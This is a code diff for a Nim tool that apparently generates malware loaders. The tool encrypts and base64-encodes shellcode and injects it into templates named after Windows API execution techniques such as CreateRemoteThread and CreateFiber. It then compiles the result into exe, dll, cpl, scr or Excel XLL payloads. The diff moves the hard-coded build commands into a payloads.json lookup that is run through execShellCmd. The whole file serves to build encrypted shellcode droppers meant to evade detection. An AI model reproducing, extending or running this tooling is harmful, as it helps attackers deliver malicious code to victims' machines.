@@ -4,6 +4,7 @@ import base64
 import nimcrypto
 import strutils
 import random
+import std/json
 
 
 let banner = """
@@ -161,357 +162,31 @@ proc main() =
         
     # Base64 encode encrypted shellcode
     let encodedCrypted = encode(encrypted)
+    var payloadFile = readFile("payloads.json")
+    var payloadData = parseJson(payloadFile)
 
     echo "Encrypting and encoding payload. May your efforts be fruitful.\n\n"
 
-
-    if apiMethod == "enumgeoid":
-
-        if fileType != "xll": 
-
-            let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoID.nim"
+    var file_path = ""
+    
+    if fileType == "xll":
+        file_path = payloadData["methods"][apiMethod]["filepaths"]["xll"].getStr()
+        if file_path != "":
             prePayloadGen(file_path, encodedCrypted, newpassword)
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.exe --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.dll --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.cpl --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.scr --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
+            if payloadData["methods"][apiMethod][fileType]["payload"].getStr() != "":
+                discard execShellCmd(payloadData["methods"][apiMethod][fileType]["payload"].getStr())
+                discard execShellCmd(payloadData["methods"][apiMethod][fileType]["cleanup"].getStr())
             else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim"
+                echo "Error with the payload, could be that the payload type does not support that method\n\n"
+                printHelp(true)
+    else:
+        file_path = payloadData["methods"][apiMethod]["filepaths"]["standard"].getStr()
+        if file_path != "":
             prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumGeoIDXLL.dll .\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim")
-            
-            discard execShellCmd("move EnumGeoIDXLL.dll EnumGeoID.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-
-    elif apiMethod == "createfiber": 
-
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\CreateFiber\\CreateFiber.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CreateFiber.exe --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CreateFiber.dll --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CreateFiber.cpl --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CreateFiber.scr --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
+            if payloadData["methods"][apiMethod]["standard"][fileType].getStr() != "":
+                discard execShellCmd(payloadData["methods"][apiMethod]["standard"][fileType].getStr())
             else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\CreateFiber\\CreateFiberXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateFiberXLL.dll .\\apiMethods\\CreateFiber\\CreateFiberXLL.nim")
-            
-            discard execShellCmd("move CreateFiberXLL.dll CreateFiber.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-     
-    elif apiMethod == "createremotethread": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.exe --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.dll --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.cpl --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.scr --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateRemoteThreadXLL.dll .\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim")
-            
-            discard execShellCmd("move CreateRemoteThreadXLL.dll CreateRemoteThread.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-       
-    elif apiMethod == "createthreadpoolwait": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.exe --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
-            elif fileType == "dll":
-                echo "DLLs will not execute with this function call due to its nature. I'll try to fix this in the future - S3lrius\n"
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
-            elif fileType == "cpl":
-                echo "Control Panel Applets will not execute with this function call due to its nature.\n"
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.scr --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateThreadpoolWaitXLL.dll .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim")
-            
-            discard execShellCmd("move CreateThreadpoolWaitXLL.dll CreateThreadpoolWait.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-        
-    elif apiMethod == "enumlanguage": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.exe --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.dll --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.cpl --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.scr --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumLanguageGroupLocalesXLL.dll .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim")
-            
-            discard execShellCmd("move EnumLanguageGroupLocalesXLL.dll EnumLanguageGroupLocales.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-        
-    elif apiMethod == "cryptenum": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.exe --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.dll --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.cpl --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.scr --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-            echo "This function currently isn't working with XLL. I'll fix this soon. -S3lrius"
-        else:
-            echo "\n"
-        
-    elif apiMethod == "enumdisplay": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.exe --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.dll --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.cpl --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.scr --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDisplayMonitorsXLL.dll .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim")
-            
-            discard execShellCmd("move EnumDisplayMonitorsXLL.dll EnumDisplayMonitors.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-        
-    elif apiMethod == "enumsystemstore": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.exe --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.dll --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.cpl --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.scr --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CertEnumSystemStoreXLL.dll .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim")
-            
-            discard execShellCmd("move CertEnumSystemStoreXLL.dll CertEnumSystemStore.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-        
-    elif apiMethod == "enumdesktop": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.exe --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.dll --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.cpl --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.scr --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDesktopWindowsXLL.dll .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim")
-            
-            discard execShellCmd("move EnumDesktopWindowsXLL.dll EnumDesktopWindows.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-
-    elif apiMethod == "enumtime": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.exe --app:gui c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.dll --app:lib c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.cpl --app:lib c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.scr --app:gui c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumTimeFormatsExXLL.dll .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim")
-            
-            discard execShellCmd("move EnumTimeFormatsExXLL.dll EnumTimeFormatsEx.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
-
-    elif apiMethod == "enumcalendar": 
-        if fileType != "xll": 
-            let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-
-
-            if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.exe --app:gui c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
-            elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.dll --app:lib c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
-            elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.cpl --app:lib c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
-            elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.scr --app:gui c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
-            else:
-                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else: 
-            echo "\n"
-
-        if fileType == "xll":
-
-            let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim"
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumCalendarInfoXLL.dll .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim")
-            
-            discard execShellCmd("move EnumCalendarInfoXLL.dll EnumCalendarInfo.xll")
-
-            postPayloadGen(file_path, encodedCrypted, newpassword)
-        else:
-            echo "\n"
+                echo "Error with the payload, could be that the payload type does not support that method\n\n"
+                printHelp(true)
+    postPayloadGen(file_path, encodedCrypted, newpassword)
 main()
